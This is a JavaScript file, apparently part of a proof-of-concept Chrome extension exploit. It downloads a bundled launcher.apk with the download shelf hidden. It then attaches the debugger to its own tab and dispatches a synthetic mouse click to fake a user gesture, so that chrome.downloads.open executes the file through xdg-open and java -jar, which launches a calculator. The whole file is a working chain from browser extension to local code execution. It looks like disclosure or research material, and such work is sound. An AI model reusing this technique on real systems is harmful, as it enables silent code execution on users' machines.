let download_id;

// Step 1:
// Disable UI indicator for downloads. Not necessary to make it work, but neater.
chrome.downloads.setShelfEnabled(false);

// Step 2:
// Download the .apk file to the Downloads folder.
chrome.downloads.download({url: chrome.runtime.getURL('launcher.apk')}, id => {
	download_id = id;
	poll();
});

// Step 3:
// Poll until the download is complete. There is a onChanged event, but it
// doesn't seem to fire for a `state` change?
function poll() {
	setTimeout(() => {
		chrome.downloads.search({id:download_id}, ([{state}]) => {
			if (state === 'complete') {
				fake_click();
			} else {
				poll();
			}
		});
	}, 20);
}

// Step 4:
// Let this tab "debug" itself. Then, through the debug API, send a fake mouse
// click, which counts as "user interaction".
function fake_click() {
	chrome.tabs.getCurrent(({id: tabId}) => {
		chrome.debugger.attach({tabId}, '1.1', () => {
			// mouse click: push button, then release it
			chrome.debugger.sendCommand({tabId}, 'Input.dispatchMouseEvent', {
				type: 'mousePressed',
				x:50, y:50,
				button: 'left',
				clickCount: 1
			});
			chrome.debugger.sendCommand({tabId}, 'Input.dispatchMouseEvent', {
				type: 'mouseReleased',
				x:50, y:50,
				button: 'left',
				clickCount: 1
			});
			chrome.debugger.detach({tabId});
		});
	});
}

document.body.onclick = () => {
	// Step 5:
	// At this point, we're handling a fake click, so chrome.downloads.open()
	// works now. The next line causes Chrome to execute
	// "xdg-open /path/to/Downloads/launcher.apk". xdg-open will (possibly
	// indirectly) invoke "java -jar /path/to/Downloads/launcher.apk", which
	// then launches gnome-calculator.
	chrome.downloads.open(download_id);

	// Step 6:
	// Turn the UI indicator back on when we're done.
	setTimeout(()=>chrome.downloads.setShelfEnabled(true), 1000);
};
